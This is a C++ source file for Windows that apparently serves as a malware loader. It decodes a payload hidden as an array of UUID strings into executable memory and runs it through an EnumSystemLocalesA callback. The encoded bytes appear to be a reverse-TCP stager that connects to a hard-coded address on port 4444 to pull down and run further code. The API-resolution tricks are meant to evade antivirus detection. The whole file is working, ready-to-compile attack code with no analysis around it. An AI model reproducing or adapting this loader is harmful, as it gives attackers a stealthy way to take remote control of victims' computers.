#include <iostream>
#include <Windows.h>
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

int main(int argc, char* argv) {
	const char* uuid[] = { "e48348fc-e8f0-00cc-0000-415141505248","5651d231-4865-528b-6048-8b5218488b52","b70f4820-4a4a-8b48-7250-4d31c94831c0","7c613cac-2c02-4120-c1c9-0d4101c1e2ed","48514152-528b-8b20-423c-4801d0668178","0f020b18-7285-0000-008b-808800000048","6774c085-0148-44d0-8b40-204901d0508b","56e31848-ff48-41c9-8b34-884801d64d31","c03148c9-c141-0dc9-ac41-01c138e075f1","244c034c-4508-d139-75d8-58448b402449","4166d001-0c8b-4448-8b40-1c4901d0418b","58418804-5841-0148-d05e-595a41584159","83485a41-20ec-5241-ffe0-5841595a488b","ff4be912-ffff-495d-be77-73325f333200","49564100-e689-8148-eca0-0100004989e5","0002bc49-5c11-a8c0-0180-41544989e44c","ba41f189-774c-0726-ffd5-4c89ea680101","41590000-29ba-6b80-00ff-d56a0a415e50","c9314d50-314d-48c0-ffc0-4889c248ffc0","41c18948-eaba-df0f-e0ff-d54889c76a10","894c5841-48e2-f989-41ba-99a57461ffd5","0a74c085-ff49-75ce-e5e8-930000004883","894810ec-4de2-c931-6a04-41584889f941","c8d902ba-ff5f-83d5-f800-7e554883c420","6af6895e-4140-6859-0010-000041584889","c93148f2-ba41-a458-53e5-ffd54889c349","314dc789-49c9-f089-4889-da4889f941ba","5fc8d902-d5ff-f883-007d-285841575968","00004000-5841-006a-5a41-ba0b2f0f30ff","415957d5-75ba-4d6e-61ff-d549ffcee93c","48ffffff-c301-2948-c648-85f675b441ff","006a58e7-4959-c2c7-f0b5-a256ffd50000" };
	int group = std::size(uuid);

	typedef LPVOID(WINAPI* oldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
	oldVirtualAlloc VA = (oldVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
	LPVOID handle = VA(0, group * 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (handle == NULL) {
		std::cout << "ÉêÇëÄÚ´æÊ§°Ü" << std::endl;
		return -1;
	}

	DWORD_PTR rwxpage = (DWORD_PTR)handle;
	for (int i = 0; i < group; i++) {
		// std::cout << uuid[i] << std::endl;
		// std::cout << (in6_addr*)rwxpage << std::endl;
		RPC_STATUS res = UuidFromStringA((RPC_CSTR)uuid[i], (UUID*)rwxpage);
		if (res != RPC_S_OK) {
			std::cout << "ÄÚ´æ×ª»»Ê§°Ü" << std::endl;
			std::cout << GetLastError() << std::endl;
			CloseHandle(handle);
			return -1;
		}
		rwxpage += 16;
	}

	DWORD oldProtect;
	typedef BOOL(WINAPI* oldVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
	oldVirtualProtect VP = (oldVirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
	VP(handle, group * 16, PAGE_EXECUTE_READWRITE, &oldProtect);
	EnumSystemLocalesA((LOCALE_ENUMPROCA)handle, 0);
	CloseHandle(handle);
	return 0;
}